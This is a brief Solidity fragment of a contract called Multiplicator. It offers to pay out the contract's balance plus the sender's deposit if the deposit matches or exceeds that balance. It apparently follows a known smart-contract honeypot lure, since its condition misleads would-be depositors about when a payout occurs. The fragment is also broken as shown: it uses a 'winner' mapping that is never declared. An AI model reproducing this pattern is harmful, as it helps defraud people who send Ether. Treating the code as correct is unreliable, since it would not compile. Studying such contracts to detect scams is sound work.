contract Multiplicator {
function multiplicate(address adr) public payable
        {
            
            if(msg.value>=this.balance)
            {
                require(winner[msg.sender] == false);// every address can only benefit once, don't be greedy 
                winner[msg.sender] = true; 
                adr.transfer(this.balance+msg.value);
            }
        }
}